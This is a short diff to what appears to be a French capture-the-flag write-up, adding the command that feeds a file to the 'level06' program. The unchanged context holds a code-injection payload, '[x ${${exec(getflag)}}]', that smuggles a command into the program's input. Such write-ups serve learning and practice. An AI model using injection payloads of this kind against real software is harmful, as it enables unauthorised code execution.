@@ -28,6 +28,7 @@ cron
 ### Level06:
 
 Injection de code '[x ${${exec(getflag)}}]' >/tmp/coucou
+./level06 /tmp/coucou
 
 ### Level07:
 
